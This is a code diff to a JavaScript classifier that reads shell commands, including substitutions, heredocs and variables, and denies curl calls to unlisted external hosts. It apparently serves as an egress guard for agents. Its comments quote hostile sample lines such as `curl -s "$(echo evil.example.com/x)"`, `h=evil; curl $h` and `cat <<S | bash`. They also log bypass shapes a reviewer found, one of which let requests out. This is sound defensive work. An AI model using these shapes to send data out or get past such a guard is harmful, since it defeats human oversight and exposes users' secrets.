@@ -433,16 +433,17 @@ export function liftSubstitutions(text) {
   // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
   // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
   // innerAt[k]: the offset of inners[k]'s `$(` / backtick (the same in `text` and `stripped`).
-  const inners = []; const innerAt = []; const herestrings = []; let out = ''; let i = 0
+  // innerEnd[k]: the offset just past inners[k]'s closing `)` / backtick.
+  const inners = []; const innerAt = []; const innerEnd = []; const herestrings = []; let out = ''; let i = 0
   // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
   const lift = (at) => {
     if (text[at] === '$' && text[at + 1] === '(') {
       const j = substEnd(text, at)
-      inners.push(text.slice(at + 2, j - 1)); innerAt.push(at); out += ' '.repeat(j - at); return j
+      inners.push(text.slice(at + 2, j - 1)); innerAt.push(at); innerEnd.push(j); out += ' '.repeat(j - at); return j
     }
     if (text[at] === '`') {
       const j = backtickEnd(text, at)
-      inners.push(text.slice(at + 1, j - 1)); innerAt.push(at); out += ' '.repeat(j - at); return j
+      inners.push(text.slice(at + 1, j - 1)); innerAt.push(at); innerEnd.push(j); out += ' '.repeat(j - at); return j
     }
     return -1
   }
@@ -478,6 +479,7 @@ export function liftSubstitutions(text) {
       // by processing it recursively, then continue with the body
       const lineRest = liftSubstitutions(text.slice(i, nl + 1))
       out += lineRest.stripped; inners.push(...lineRest.inners); innerAt.push(...lineRest.innerAt.map((p) => p + i))
+      innerEnd.push(...lineRest.innerEnd.map((p) => p + i))
       herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
       const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
       const rel = endRx.exec(text.slice(i))
@@ -513,7 +515,32 @@ export function liftSubstitutions(text) {
     if (n !== -1) { i = n; continue }
     out += c; i++
   }
-  return { stripped: out, inners, innerAt, herestrings }
+  // marked: `stripped` with each lifted region filled with its own marker instead of blanks, so a
+  // reader can still tell WHERE a substitution stood (a curl destination built by one, didi F3).
+  let marked = out
+  innerAt.forEach((at, k) => { marked = marked.slice(0, at) + markOf(k).repeat(innerEnd[k] - at) + marked.slice(innerEnd[k]) })
+  return { stripped: out, marked, inners, innerAt, innerEnd, herestrings }
+}
+// A lifted substitution's place in a marked text: one private-use character per substitution, k-th
+// substitution = U+E000 + k, repeated over its length (length-preserving, never whitespace, never a
+// shell metacharacter, so it stays inside the word it was part of).
+const MARK_BASE = 0xE000
+const MARK_LAST = 0xF8FF
+const MARKS = /[\uE000-\uF8FF]/
+function markOf(k) { return String.fromCharCode(Math.min(MARK_BASE + k, MARK_LAST)) }
+// Every `$(...)` and backtick in `text`, quoting ignored, replaced by its marker: for an UNREADABLE line,
+// whose quoting is exactly what could not be read. Erring toward a marker only judges more text.
+function markAllSubstitutions(text) {
+  const inners = []; let out = ''; let i = 0
+  while (i < text.length) {
+    if (text[i] === '\\') { out += text.slice(i, i + 2); i += 2; continue }
+    let j = -1
+    if (text[i] === '$' && text[i + 1] === '(') { j = substEnd(text, i); inners.push(text.slice(i + 2, j - 1)) }
+    else if (text[i] === '`') { j = backtickEnd(text, i); inners.push(text.slice(i + 1, j - 1)) }
+    if (j === -1) { out += text[i]; i++; continue }
+    out += markOf(inners.length - 1).repeat(j - i); i = j
+  }
+  return { marked: out, inners }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -571,22 +598,56 @@ export function shellWords(text) {
 // the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
 // (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
 // too (`$PROTO://host`), so everything up to `://` is dropped.
+function hostPortion(value) {
+  const noScheme = String(value).replace(/^[^/?#\s]*:\/\//, '')
+  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
+  return m ? m[1].toLowerCase() : ''
+}
 export function destHost(value) {
   if (!value) return null
-  const noScheme = value.replace(/^[^/?#\s]*:\/\//, '')
-  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
-  const h = m ? m[1].toLowerCase() : ''
+  const h = hostPortion(value)
   if (HOSTNAME.test(h)) return h
   // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
   // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
   // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
   return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
 }
+// The hosts a substitution's command text names (didi F3, card c8b1ccbf): every word, a `://` word
+// through destHost, any other word whose host part (path, userinfo and port cut off) is a hostname.
+// Unlike an unreadable line's word reading, a bare dotted name counts: in a destination it IS the host.
+const SUBST_WORD_SPLIT = /[\s"'`;|&()<>=,{}$]+/
+function substHostCandidates(inner) {
+  const out = []
+  for (const w of String(inner).split(SUBST_WORD_SPLIT)) {
+    if (!w) continue
+    if (w.includes('://')) { const h = destHost(w); if (h) out.push(h); continue }
+    const name = w.split(/[/?#]/)[0].replace(/^.*@/, '').replace(/:\d+$/, '').toLowerCase()
+    if (HOSTNAME.test(name)) out.push(name)
+  }
+  return out
+}
+// Output-file flags: their value is a path curl writes, never a host (an unreadable line's word
+// reading took `-o out.dir/file.json` for the host out.dir, didi's review 3).
+const CURL_FILE_SHORT = new Set(['o', 'D', 'c'])
+const CURL_FILE_LONG = new Set(['output', 'output-dir', 'dump-header', 'cookie-jar', 'stderr', 'trace', 'trace-ascii', 'etag-save'])
 // Every external destination host in a curl argv (the words AFTER `curl`).
-export function curlDestinations(args) {
+// `inners`: the substitutions of a MARKED argv (markOf). A destination whose host part holds a marker
+// was built by that substitution: the hosts its command text names are destinations, and when it names
+// none the destination is unknowable and is returned as `$(<command>)`, a host no list holds (didi F3:
+// `curl -s "$(echo evil.example.com/x)"` passed live). `fileValues`: collects output-file flag values.
+export function curlDestinations(args, inners = null, fileValues = null) {
   const dests = []
-  const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h) }
-  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()) }
+  const fromMarks = (part) => {
+    if (!inners || !MARKS.test(part)) return false
+    for (const k of new Set([...part].filter((c) => MARKS.test(c)).map((c) => c.charCodeAt(0) - MARK_BASE))) {
+      if (inners[k] == null) continue
+      const found = substHostCandidates(inners[k])
+      dests.push(...(found.length ? found : [`$(${inners[k].trim()})`]))
+    }
+    return true
+  }
+  const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h); else if (v != null) fromMarks(hostPortion(v)) }
+  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()); else fromMarks(p) }
   for (let k = 0; k < args.length; k++) {
     const w = args[k]
     if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
@@ -597,6 +658,7 @@ export function curlDestinations(args) {
       const v = inline !== undefined ? inline : args[++k]
       if (CURL_DEST_URL.has(name)) addUrl(v)
       else if (CURL_DEST_PARTS.has(name)) addParts(v)
+      else if (fileValues && CURL_FILE_LONG.has(name) && v != null) fileValues.add(v)
       continue
     }
     if (w.startsWith('-') && w.length > 1) {
@@ -604,6 +666,7 @@ export function curlDestinations(args) {
         if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
         const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
         if (CURL_DEST_URL.has(w[q])) addUrl(v)
+        else if (fileValues && CURL_FILE_SHORT.has(w[q]) && v != null) fileValues.add(v)
         break
       }
       continue
@@ -904,12 +967,24 @@ const UNREAD_WORD_SPLIT = /[\s"'`;|&()<>=,{}]+/
 const DOTTED_HOST = /^(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9-]*[a-z][a-z0-9-]*$/i
 const IPV4_SHAPE = /^\d{1,3}(?:\.\d{1,3}){3}$/
 // curl's destinations in an unreadable line: the argv after each `curl`, up to the end of its line or
-// sub-command, through the same flag table as the readable path (so `-o out.html` is no host).
-function unreadableCurlHosts(text) {
+// sub-command, through the same flag table as the readable path (so `-o out.html` is no host). The
+// substitutions are marked first (a `$(...)` neither cuts the argv nor hides the host it builds), and
+// every NAME=value in the line is a value $NAME can take (didi's review 3: `h=evil; curl $h` passed).
+// `fileValues` collects the output-file values, which the word reading then skips.
+const UNREAD_ASSIGN = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s;&|)]*))/g
+function unreadableCurlHosts(text, fileValues) {
+  const { marked, inners } = markAllSubstitutions(text)
+  const values = {}
+  for (const m of marked.matchAll(UNREAD_ASSIGN)) (values[m[1]] ??= []).push(m[3] ?? m[4] ?? m[5] ?? '')
+  const last = Object.fromEntries(Object.entries(values).map(([v, xs]) => [v, xs[xs.length - 1]]))
   const out = []
-  for (const m of text.matchAll(/(?:^|[^A-Za-z0-9_-])curl(?![A-Za-z0-9_-])/gi)) {
-    const seg = text.slice(m.index + m[0].length).split(/[\n;|&()`]/)[0]
-    out.push(...curlDestinations(shellWords(seg)))
+  for (const m of marked.matchAll(/(?:^|[^A-Za-z0-9_-])curl(?![A-Za-z0-9_-])/gi)) {
+    const seg = marked.slice(m.index + m[0].length).split(/[\n;|&()`]/)[0]
+    // past MAX_LOOP_VARIANTS combinations, each variable's last value is read (the line still denies
+    // on any literal host it holds)
+    for (const t of [seg, ...(loopVariants(seg, {}, values) ?? [expand(seg, last)])]) {
+      out.push(...curlDestinations(shellWords(t), inners, fileValues))
+    }
   }
   return out
 }
@@ -922,10 +997,10 @@ function unreadableCurlHosts(text) {
 // is judged for curl (curlDestinations reads its argv); for a socket-level connect it stays open (see
 // the header). A word starting with `@` is a file (`-d @file`), not a host.
 const IPV6_BRACKET = /^\[(?=[0-9a-f:.]*:[0-9a-f:.]*:)[0-9a-f:.]+\]$/i
-function unreadableWordHosts(text) {
+function unreadableWordHosts(text, skip = new Set()) {
   const out = []
   for (const w of text.split(UNREAD_WORD_SPLIT)) {
-    if (!w || w.startsWith('@')) continue
+    if (!w || w.startsWith('@') || skip.has(w)) continue
     if (w.includes('://')) { const h = destHost(w); if (h) out.push(h); continue }
     const hostPart = w.split(/[/?#]/)[0]
     const suffixed = hostPart.length < w.length
@@ -936,7 +1011,9 @@ function unreadableWordHosts(text) {
 }
 function unreadableVerdict(text, vendorHosts, vendorDomains) {
   if (namesNetwork(text)) {
-    const found = [...externalHosts(text, vendorHosts, vendorDomains), ...unreadableCurlHosts(text), ...unreadableWordHosts(text)]
+    const files = new Set()
+    const curlHosts = unreadableCurlHosts(text, files)
+    const found = [...externalHosts(text, vendorHosts, vendorDomains), ...curlHosts, ...unreadableWordHosts(text, files)]
     const hosts = [...new Set(found)].filter((h) => !isLocalHost(h) && !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
     if (hosts.length) return { deny: true, reason: 'unparseable-external', hosts }
   }
@@ -960,31 +1037,104 @@ function shellCBody(args) {
   }
   return null
 }
-// Does a shell read its STDIN as its program? `bash`, `bash -s`, `bash -`, `bash /dev/stdin` do, and so
-// does `bash -c 'bash'` / `bash -c 'sh -s'` / `bash -c 'exec bash'`: the -c body hands the stdin to a
-// shell that runs it (didi F2, card c8b1ccbf). `bash script.sh -` (a script operand) and `bash -c
-// 'cat'` read stdin as DATA: `bash agent-msg.sh a b - <<'VEGE'` feeds a message, not a program. `args`
+// Is a shell's STDIN only DATA to it? The answer needs POSITIVE evidence (didi's review 3: listing the
+// shapes that read stdin as a program -- `bash`, `-s`, `-`, `/dev/stdin`, a -c body running `bash` --
+// left `-c 'source /dev/stdin'`, `-c 'eval "$(cat)"'` and the like open). Data: a script operand
+// (`bash agent-msg.sh a b - <<'VEGE'` feeds a message), or a -c body that only prints text or hands
+// the stdin to one shell that is itself given a script. Everything else reads as a program. `args`
 // are the words after the shell's name, up to the `<<`.
 const STDIN_PATH = /^\/(?:dev\/stdin|dev\/fd\/0|proc\/self\/fd\/0)$/
-function shellStdinIsProgram(args) {
+function shellStdinIsData(args) {
   for (let k = 0; k < args.length; k++) {
     const a = args[k]
-    if (a === '-' || STDIN_PATH.test(a)) return true
+    if (a === '-' || STDIN_PATH.test(a)) return false
     if (a === '--') continue
     if (/^[-+][oO]$/.test(a)) { k++; continue }
-    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(a)) return shellCBodyReadsStdin(args[k + 1] ?? '')
-    if (/^-[A-Za-z]*s[A-Za-z]*$/.test(a)) return true
+    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(a)) return shellCBodyIsData(args[k + 1] ?? '')
+    if (/^-[A-Za-z]*s[A-Za-z]*$/.test(a)) return false
     if (/^[-+]/.test(a)) continue
-    return false
+    return true
   }
-  return true
+  return false
 }
-// A `-c` body that runs a shell (anywhere in it: `exec bash`, `cat | bash`) whose own stdin is the
-// program: that shell's arguments decide, as they would for a shell on the command line.
-function shellCBodyReadsStdin(body) {
-  const w = shellWords(body)
-  for (let j = 0; j < w.length; j++) {
-    if (SHELL.test(normalizedName(w[j])) && shellStdinIsProgram(w.slice(j + 1))) return true
+// The sub-commands of a -c body, as shell-word arrays (a body is short; quotes are honoured per piece).
+function bodyCommands(body) {
+  return String(body).split(/&&|\|\||[;|&\n]/).map((x) => shellWords(x)).filter((w) => w.length)
+}
+// A -c body that reads its stdin as data: no substitution and no process substitution (either can
+// run the stdin), and either every sub-command is a bare text-only word, or the body is ONE shell
+// sub-command whose own stdin is data (`bash -c 'bash ./x.sh -'`). `cat > a.sh; bash a.sh` is two
+// sub-commands, so it is a program: the body is written and run.
+function shellCBodyIsData(body) {
+  if (/\$\(|`|[<>]\(/.test(body)) return false
+  const cmds = bodyCommands(body)
+  if (cmds.every((w) => TEXT_ONLY.has(w[0]))) return true
+  if (cmds.length !== 1) return false
+  const w = cmds[0]; const i = commandIndex(w)
+  return i < w.length && SHELL.test(normalizedName(w[i])) && shellStdinIsData(w.slice(i + 1))
+}
+// The interpreter a shell's -c body hands its stdin to as a program (`bash -c 'python3 -'`,
+// `sh -c 'exec node'`), or null: such a body is judged by the interpreter rule, not as a command line.
+// An interpreter given a code flag or a script operand reads its stdin as data.
+function stdinInterpreter(args) {
+  const body = shellCBody(args)
+  if (body === null) return null
+  for (const w of bodyCommands(body)) {
+    const i = commandIndex(w)
+    const name = i < w.length ? normalizedName(w[i]) : ''
+    if (!INTERPRETER.test(name)) continue
+    const rest = w.slice(i + 1)
+    if (rest.some((x) => CODE_FLAG.has(x) || PS_CODE_FLAG.test(x))) continue
+    if (rest.every((x) => x === '-' || STDIN_PATH.test(x) || x.startsWith('-'))) return name
+  }
+  return null
+}
+// Sub-commands that run their stdin: `source /dev/stdin`, `. /dev/stdin` (or with no operand), and eval,
+// whose argument is a substitution reading the stdin (`eval "$(cat)"`).
+function runsStdin(sw) {
+  const w = sw.filter((x) => !/^[{}()!]+$/.test(x)).map((x) => x.replace(/^[{(]+/, ''))
+  const i = commandIndex(w)
+  if (i >= w.length) return false
+  const c = normalizedName(w[i])
+  if (c === 'eval') return true
+  if (c === 'source' || w[i] === '.') return w[i + 1] === undefined || STDIN_PATH.test(w[i + 1])
+  return SHELL.test(c) && !shellStdinIsData(w.slice(i + 1))
+}
+// Redirection words (`<<S`, `>out`, `2>&1`, or an operator alone with its target after it) dropped.
+function withoutRedirects(sw) {
+  const out = []
+  for (let k = 0; k < sw.length; k++) {
+    if (/^\d*(?:<<-?|<<<|>>?|<|&>|>&|<&)/.test(sw[k])) { if (/^\d*(?:<<-?|<<<|>>?|<|&>|>&|<&)$/.test(sw[k])) k++; continue }
+    out.push(sw[k])
+  }
+  return out
+}
+// Does a heredoc fed to a command that is NOT a shell or an interpreter still reach one as its program?
+// Three doors (didi's review 3): the command runs its stdin itself (`source /dev/stdin <<S`); it closes
+// a group whose members share the stdin (`{ bash; } <<S`); or its output goes down a pipe into a shell
+// (`cat <<S | bash`, `base64 -d <<S | sh`). Only the heredoc's own line is read, cut before the body.
+// Anything else (`gh pr comment --body-file -`, `git commit -F -`) keeps the body as data.
+function feedRunsAsProgram(orig, masked, at) {
+  const ls = orig.lastIndexOf('\n', at - 1) + 1
+  const nl = orig.indexOf('\n', at)
+  const le = nl === -1 ? orig.length : nl
+  const line = spans(masked).filter(([a, b]) => b > ls && a < le)
+  const wordsOf = ([a, b]) => withoutRedirects(shellWords(orig.slice(Math.max(a, ls), Math.min(b, le))))
+  const k = line.findIndex(([a, b]) => at >= a && at < b)
+  if (k === -1) return false
+  const own = wordsOf(line[k])
+  if (runsStdin(own)) return true
+  if (own.length === 0 || /^[})]/.test(own[0])) {
+    for (let j = k - 1; j >= 0; j--) {
+      const w = wordsOf(line[j])
+      if (runsStdin(w)) return true
+      if (/^[{(]/.test(w[0] ?? '')) break
+    }
+  }
+  for (let j = k; j + 1 < line.length; j++) {
+    const b = line[j][1]
+    if (masked[b] !== '|' || masked[b + 1] === '|') break
+    if (runsStdin(wordsOf(line[j + 1]))) return true
   }
   return false
 }
@@ -997,6 +1147,19 @@ function argsBefore(orig, masked, at) {
   }
   return []
 }
+// The curl destinations a substitution builds on a readable line (didi F3, card c8b1ccbf): the
+// sub-command read from the MARKED text, every loop reading too, so a host part holding a marker names
+// the substitution that built it (curlDestinations reads that substitution's command for hosts).
+function substitutedCurlHosts(seg, env, loops, inners) {
+  const out = []
+  for (const t of [expand(seg, env), ...(loopVariants(seg, env, loops) ?? [])]) {
+    if (!MARKS.test(t)) continue
+    const argv = shellWords(t)
+    const at = argv.findIndex((w) => normalizedName(w) === 'curl')
+    if (at !== -1) out.push(...curlDestinations(argv.slice(at + 1), inners))
+  }
+  return out
+}
 // A variable assigned from a substitution (`x=$(...)`, `export x="$(...)"`): the text before the `$(`.
 const ASSIGNED_FROM_SUBST = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+|declare\s+(?:-\w+\s+)?)?([A-Za-z_][A-Za-z0-9_]*)="?$/
 // `substituted`: this text is the inside of a $(...) / `...`, whose output the outer line uses.
@@ -1005,7 +1168,7 @@ const ASSIGNED_FROM_SUBST = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+|dec
 // the inner curl with u bound (card c8b1ccbf, shape 6: live on 2026-10-15, four requests went out).
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), substituted = false, inherited = null) {
   const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
-  const { stripped: orig, inners, innerAt, herestrings } = liftSubstitutions(norm)
+  const { stripped: orig, marked, inners, innerAt, herestrings } = liftSubstitutions(norm)
   const masked = maskInertLiterals(orig)
   if (masked === null || masked.length !== orig.length) {
     if (depth < 4) {
@@ -1015,6 +1178,10 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
   }
   const env = { ...(inherited?.env ?? {}), ...collectAssignments(orig, masked) }
   const loops = { ...(inherited?.loops ?? {}), ...collectLoops(orig, masked, env) }
+  // The same assignments read from the MARKED text (`h=$(...)` keeps its marker), and each substitution's
+  // command with this line's assignments expanded: what a curl destination built by one can be (F3).
+  const markedEnv = { ...(inherited?.env ?? {}), ...collectAssignments(marked, masked) }
+  const innerTexts = inners.map((x) => expand(x, env))
   // `x=$(cat <<EOF ... EOF); curl "$x"`: the substitution's output is not known, but a URL written in
   // it is a value x can take (card c8b1ccbf, shape 5). Judged like a loop value; the plain reading,
   // with x empty, is judged as well.
@@ -1040,11 +1207,25 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
   // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
   // shell interpreter's body is a command line of its own, so it gets the whole analysis.
   for (const f of feeds) {
-    const cmd = commandWordAt(masked, f.at)
-    const shell = cmd !== null && SHELL.test(cmd)
-    if (!shell && !(cmd !== null && INTERPRETER.test(cmd.toLowerCase()))) continue
+    let cmd = commandWordAt(masked, f.at)
+    let shell = cmd !== null && SHELL.test(cmd)
+    const shellArgs = shell ? argsBefore(orig, masked, f.at) : []
+    // `bash -c 'python3 -'`: the body is the interpreter's program, judged by the interpreter rule
+    const handedTo = shell ? stdinInterpreter(shellArgs) : null
+    if (handedTo) { cmd = handedTo; shell = false }
     const plain = f.expands ? expand(f.text, env) : f.text
     const variants = f.expands ? loopVariants(f.text, env, loops) : []
+    if (!shell && !(cmd !== null && INTERPRETER.test(cmd.toLowerCase()))) {
+      // Not a shell's own heredoc, but the body can still reach one (`source /dev/stdin`, `{ bash; }`,
+      // `cat <<S | bash`): then it is a program and gets the whole analysis.
+      if (depth >= 4 || !feedRunsAsProgram(orig, masked, f.at)) continue
+      for (const text of [plain, ...(variants ?? [])]) {
+        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops })
+        if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
+      }
+      if (variants === null) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
+      continue
+    }
     for (const text of [plain, ...(variants ?? [])]) {
       if (shell) {
         if (depth >= 4) break
@@ -1052,7 +1233,7 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
         // The unreadable-line rule judges a PROGRAM. A body fed to a script as data keeps the reading
         // it had before card c8b1ccbf: measured on 4 days of fleet commands (21 086), the one heredoc
         // it would have newly denied was an agent-msg.sh message mentioning a link.
-        if (r.deny && r.reason === 'unparseable-external' && !shellStdinIsProgram(argsBefore(orig, masked, f.at))) continue
+        if (r.deny && r.reason === 'unparseable-external' && shellStdinIsData(shellArgs)) continue
         if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
         continue
       }
@@ -1073,6 +1254,7 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     // loop-only reading would let the assigned value go unjudged (didi's review of 804ab1cf).
     const plain = expand(orig.slice(a, b), env)
     const variants = loopVariants(orig.slice(a, b), env, loops)
+    let substHosts = null
     for (const text of [plain, ...(variants ?? [])]) {
       // The command NAME is read from the ORIGINAL text through shellWords, not from the masked one:
       // masking blanks a quoted "curl", and the shell runs `Curl` (case-insensitive disk,
@@ -1114,8 +1296,10 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       let found
       const argv = target === 'curl' ? shellWords(text) : null
       const at = argv ? argv.findIndex((w) => normalizedName(w) === 'curl') : -1
-      if (at !== -1) found = curlDestinations(argv.slice(at + 1))
-      else found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
+      if (at !== -1) {
+        substHosts ??= substitutedCurlHosts(marked.slice(a, b), markedEnv, loops, innerTexts)
+        found = [...curlDestinations(argv.slice(at + 1)), ...substHosts]
+      } else found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
       // A listed vendor host (or a host under a listed domain) passes only by itself: any other
       // destination in the same call still denies.
       const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
